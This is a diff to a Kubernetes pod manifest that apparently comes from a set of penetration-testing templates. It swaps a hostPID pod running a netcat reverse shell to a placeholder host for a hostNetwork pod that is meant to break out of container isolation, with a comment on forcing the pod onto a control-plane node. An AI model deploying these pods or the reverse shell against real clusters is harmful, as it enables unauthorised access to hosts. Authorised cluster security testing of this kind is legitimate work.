@@ -1,21 +1,20 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-hostpid-only.yaml 
-## Access: kubectl -n [namespace] exec -it pod-hostpid -- bash
-## Remove: kubectl -n [namespace] delete -f pod-hostpid-only.yaml
+## Deploy: kubectl -n [namespace] apply -f pod-hostnetwork.yaml 
+## Access: kubectl -n [namespace] exec -it pod-hostnetwork -- bash
+## Remove: kubectl -n [namespace] delete pod-hostnetwork
 ###########################################################
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostpid-revshell
+  name: pod-hostnetwork
   labels:
     app: pentest
 spec:
-  hostPID: true
+  hostNetwork: true
   containers:
-  - image: busybox
+  - image: ubuntu
     command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    imagePullPolicy: IfNotPresent
-    name: hostpid-revshell
+    args: [ "while true; do sleep 30; done;" ]
+    name: hostnetwork
   # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
   #nodeName: k8s-control-plane-node
